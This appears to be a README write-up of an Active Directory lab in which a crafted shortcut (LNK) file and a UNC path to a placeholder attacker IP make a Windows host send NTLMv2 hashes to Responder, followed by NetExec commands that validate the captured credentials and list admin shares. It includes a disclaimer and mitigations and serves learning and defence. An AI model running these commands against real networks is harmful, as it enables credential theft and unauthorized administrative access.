# 🔐 LNK File Attack with Responder (Active Directory Lab)

![Kali Linux](https://img.shields.io/badge/Kali-Linux-blue?logo=kalilinux)
![Active Directory](https://img.shields.io/badge/Active%20Directory-Lab-green)
![Responder](https://img.shields.io/badge/Tool-Responder-orange)
![NetExec](https://img.shields.io/badge/Tool-NetExec-red)
![Status](https://img.shields.io/badge/Status-Completed-success)

---

## ⚠️ Disclaimer

This project was conducted in a **controlled and authorized lab environment** for educational purposes only.

- No real systems were targeted
- No unauthorized access was performed
- All IPs, usernames, and machine names have been replaced with placeholders

This content is shared strictly for **learning cybersecurity and ethical hacking concepts**.

---

## 📌 Overview

This lab demonstrates how a crafted **LNK (shortcut) file** can trigger outbound authentication in a Windows environment and how **Responder** can capture NTLMv2 hashes.

The lab also focuses heavily on **troubleshooting**, especially when expected triggers fail.

---

## 🎯 Objectives

- Setup Responder on attacker machine
- Trigger authentication from Windows target
- Capture NTLMv2 hash
- Validate credentials
- Identify privilege level
- Understand differences between login vs admin access

---

## 🧪 Lab Environment

### Attacker

- Kali Linux

### Targets

- Windows Workstation
- Domain Controller

### Tools Used

- Responder
- NetExec
- SMB Protocol

---

## ⚙️ Step 1: Start Responder

```bash
sudo responder -I <INTERFACE> -v
```

Optional (Analyze mode):

```bash
sudo responder -I <INTERFACE> -A -v
```

---

## 🔍 Step 2: Initial Issue

Responder was running but:

- No hashes were captured
- No trigger activity in analyze mode

### Root Cause

The issue was **not the tool**, but the **trigger mechanism (LNK behavior)**.

---

## 🧪 Step 3: Manual Verification

Manual authentication test:

```text
\\<ATTACKER_IP>\
```

### Result

- Authentication triggered successfully
- NTLMv2 hash captured

---

## 🔑 Step 4: Hash Capture

Example output:

```text
[SMB] NTLMv2-SSP Username : <DOMAIN>\\<USERNAME>
[SMB] NTLMv2-SSP Hash     : <NTLMV2_HASH>
```

---

## 🔓 Step 5: Validate Credentials

```bash
netexec smb <TARGET_IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD>
```

### Result

```text
[+] <DOMAIN>\\<USERNAME>:<PASSWORD> (Pwn3d!)
```

---

## 📂 Step 6: Check Share Access

```bash
netexec smb <TARGET_IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --shares
```

### Result

```text
ADMIN$   READ,WRITE
C$       READ,WRITE
IPC$     READ
```

### Interpretation

✔ Administrative access confirmed

---

## 🌐 Step 7: Test on Domain Controller

```bash
netexec smb <DC_IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD>
```

### Result

- Login successful
- No admin access (no Pwn3d!)

### Insight

✔ Same credentials ≠ same privilege everywhere

---

## 🧠 Key Learnings

- Tool version differences matter
- LNK trigger can be unreliable
- Manual testing is critical
- Always validate credentials
- Admin access must be confirmed separately
- Environment impacts results

---

## 🛡️ Security Impact

- Weak passwords can lead to compromise
- NTLM authentication can be abused
- Outbound authentication is risky

---

## 🛡️ Mitigation

- Enforce strong passwords
- Limit local admin privileges
- Enable SMB signing
- Monitor unusual authentication traffic
- Harden endpoints

---

## ✅ Conclusion

This lab successfully demonstrated:

- NTLMv2 hash capture using Responder
- Troubleshooting failed triggers
- Credential validation with NetExec
- Admin access confirmation on workstation
- Difference between user vs admin access

---

## 📦 Placeholders Used

```text
<ATTACKER_IP>
<TARGET_IP>
<DC_IP>
<DOMAIN>
<USERNAME>
<PASSWORD>
<NTLMV2_HASH>
```

---

## ⭐ Summary

Captured NTLMv2 hash via Responder, validated credentials, and confirmed administrative access on a workstation. Demonstrated practical troubleshooting and real-world attack flow in an Active Directory lab.

---

💡 _Focus was not just on running tools, but understanding behavior and debugging issues._
